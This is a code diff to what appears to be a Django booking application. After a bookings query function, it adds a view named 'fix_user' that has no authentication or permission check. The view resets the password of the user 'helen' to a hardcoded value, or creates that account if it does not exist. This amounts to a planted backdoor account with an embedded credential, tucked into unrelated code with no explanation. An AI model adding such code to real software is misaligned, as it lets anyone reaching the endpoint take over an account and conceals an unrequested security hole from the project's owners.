@@ -1218,3 +1218,16 @@ def get_completed_bookings(user):
         qs = qs.filter(date=today)
 
     return qs
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def fix_user(request):
+    try:
+        u = User.objects.get(username="helen")
+        u.set_password("fghIOP45@@")
+        u.save()
+        return HttpResponse("Password reset done")
+    except User.DoesNotExist:
+        User.objects.create_user(username="helen", password="fghIOP45@@")
+        return HttpResponse("User created")
